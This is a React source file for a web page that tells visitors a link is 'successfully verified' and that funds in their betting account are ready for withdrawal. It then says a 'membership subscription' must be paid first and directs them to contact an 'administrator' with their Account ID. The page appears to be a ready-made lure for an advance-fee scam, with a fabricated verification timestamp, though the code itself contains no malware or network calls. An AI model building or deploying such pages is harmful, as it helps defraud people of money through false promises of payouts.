import { useState } from 'react';
import './App.css';

function App() {
  const [showVerifyPage, setShowVerifyPage] = useState(false);

  const handleVerifyMembership = () => {
    setShowVerifyPage(true);
  };

  if (showVerifyPage) {
    return <VerifyPage onBack={() => setShowVerifyPage(false)} />;
  }

  return (
    <div className="App">
      <div className="card">
        {/* Tick icon at the top */}
        <div className="tick-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M20 6L9 17L4 12" stroke="#4caf50" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>

        <h1>Link successfully verified</h1>
        <p className="subtitle">
          Withdrawal of your funds in your betting account
        </p>

        <div className="divider"></div>

        <div className="link-section">
          <div className="verification-status">
            <div className="mini-tick">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M20 6L9 17L4 12" stroke="#4caf50" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <span className="verified-badge">Confirmed</span>
          </div>
          <p className="date">Verified on April 28, 2026 at 10:30 AM</p>
        </div>

        <div className="divider"></div>

        <div className="membership-section">
          <div className="membership-header">
            <div className="shield-icon-medium">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2L3 7L3 12C3 16.97 7.03 21 12 21C16.97 21 21 16.97 21 12L21 7L12 2Z" fill="#f5a623"/>
                <path d="M12 8L12 13" stroke="white" strokeWidth="2" strokeLinecap="round"/>
                <circle cx="12" cy="16" r="1" fill="white"/>
              </svg>
            </div>
            <h3>Membership subscription needed for the withdrawal to be successful</h3>
          </div>
          <p className="membership-text">
            Once the membership subscription has been done you will be eligible to do the withdrawal immediately
          </p>
        </div>

        <div className="divider"></div>

        <button className="verify-membership-button" onClick={handleVerifyMembership}>
          Verify the Membership
        </button>

        <button className="later-button">Later</button>
      </div>
    </div>
  );
}

// Verify Page - Simple contact info (no form)
function VerifyPage({ onBack }) {
  return (
    <div className="App">
      <div className="card">
        {/* <button className="back-link" onClick={onBack}>← Back</button> */}
        
        <div className="contact-shield">
          <svg viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2L3 7L3 12C3 16.97 7.03 21 12 21C16.97 21 21 16.97 21 12L21 7L12 2Z" fill="#f5a623"/>
            <path d="M12 8L12 13" stroke="white" strokeWidth="2" strokeLinecap="round"/>
            <circle cx="12" cy="16" r="1" fill="white"/>
          </svg>
        </div>
        
        <h2>Contact Administrator</h2>
        <p className="subtitle">to verify your membership</p>

        <div className="divider"></div>

    

        <div className="divider"></div>

        <p className="contact-note">
          Please contact our administrator to complete your membership verification.
          Include your Account ID for faster processing.
        </p>

        <button className="later-button" onClick={onBack}>Back</button>
      </div>
    </div>
  );
}

export default App;